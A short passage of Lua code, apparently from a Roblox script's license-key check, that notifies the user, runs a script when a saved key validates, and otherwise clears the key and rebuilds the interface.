        Notify("Welcome Back", "License validated!", 2, "success")
        task.wait(1.5)
        ExecuteScript() -- ✅ CHAMA SEU SCRIPT AQUI TAMBÉM
    else
        clearKey()
        Notify("Expired", "Saved license is no longer valid", 3, "warning")
        task.wait(1)
        Build()
    end
else
    Build()
end